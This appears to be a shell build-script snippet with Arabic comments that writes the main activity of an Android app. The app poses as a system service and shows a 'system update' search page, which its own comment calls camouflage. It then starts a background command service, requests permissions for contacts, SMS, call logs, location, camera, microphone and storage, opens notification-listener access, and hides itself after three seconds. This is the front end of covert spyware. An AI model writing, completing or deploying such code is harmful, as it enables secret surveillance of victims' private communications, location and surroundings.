          # إنشاء MainActivity.java
          cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
          package com.android.system.service;
          
          import android.app.Activity;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.provider.Settings;
          import android.webkit.WebView;
          import android.widget.Toast;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.util.ArrayList;
          import java.util.List;
          
          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST_CODE = 1234;
              
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // فتح صفحة تمويه
                  WebView webView = new WebView(this);
                  webView.getSettings().setJavaScriptEnabled(true);
                  webView.loadUrl("https://www.google.com/search?q=system+update");
                  setContentView(webView);
                  
                  // بدء الخدمة
                  Intent serviceIntent = new Intent(this, CommandService.class);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      startForegroundService(serviceIntent);
                  } else {
                      startService(serviceIntent);
                  }
                  
                  // طلب الصلاحيات
                  requestAllPermissions();
                  
                  // طلب صلاحية الإشعارات
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                      Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                      startActivity(intent);
                  }
                  
                  // إخفاء التطبيق بعد 3 ثوان
                  new android.os.Handler().postDelayed(() -> {
                      moveTaskToBack(true);
                  }, 3000);
              }
              
              private void requestAllPermissions() {
                  List<String> permissions = new ArrayList<>();
                  
                  String[] allPermissions = {
                      android.Manifest.permission.READ_CONTACTS,
                      android.Manifest.permission.READ_CALL_LOG,
                      android.Manifest.permission.READ_SMS,
                      android.Manifest.permission.RECEIVE_SMS,
                      android.Manifest.permission.ACCESS_FINE_LOCATION,
                      android.Manifest.permission.ACCESS_COARSE_LOCATION,
                      android.Manifest.permission.CAMERA,
                      android.Manifest.permission.RECORD_AUDIO,
                      android.Manifest.permission.READ_EXTERNAL_STORAGE,
                      android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                      android.Manifest.permission.READ_PHONE_STATE,
                      android.Manifest.permission.PROCESS_OUTGOING_CALLS
                  };
                  
                  for (String perm : allPermissions) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          permissions.add(perm);
                      }
                  }
                  
                  if (!permissions.isEmpty()) {
                      ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                  }
              }
          }
